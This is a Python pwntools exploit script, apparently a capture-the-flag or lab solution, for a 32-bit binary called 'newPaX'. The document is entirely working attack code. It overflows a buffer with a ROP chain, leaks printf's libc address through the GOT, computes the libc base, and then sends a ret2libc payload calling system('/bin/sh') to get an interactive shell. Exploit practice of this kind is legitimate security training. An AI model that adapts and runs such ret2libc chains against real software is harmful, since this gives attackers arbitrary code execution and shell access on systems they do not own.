from pwn import *

LOCAL = True
local_bin = './newPaX'
GDB = True

elf = ELF(local_bin)
rop = ROP(elf)

sh = process(local_bin)
libc = ELF("/usr/lib/i386-linux-gnu/libc-2.32.so")


OFFSET = b'a'*52

# gadgets
PRINTF_PLT = elf.plt['printf']
VULN_PLT = elf.symbols['vuln']

log.info("Main start: " + hex(VULN_PLT))
log.info("Puts plt: " + hex(PRINTF_PLT))

def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    
    payload = OFFSET + p32(PRINTF_PLT) + p32(VULN_PLT) + p32(FUNC_GOT)
    sh.sendline(payload)
    
    recv = sh.read(4)
    leak = unpack(recv)
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    
    return hex(leak)

get_addr("printf")

if libc == "":
    exit()

BINSH = next(libc.search("/bin/sh".encode())) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
log.info("exit %s " % hex(EXIT))

log.info("puts %s " % hex(libc.sym["puts"]))

payload = OFFSET + p32(SYSTEM) + p32(EXIT) + p32(BINSH)


sh.sendline(payload)

sh.interactive()
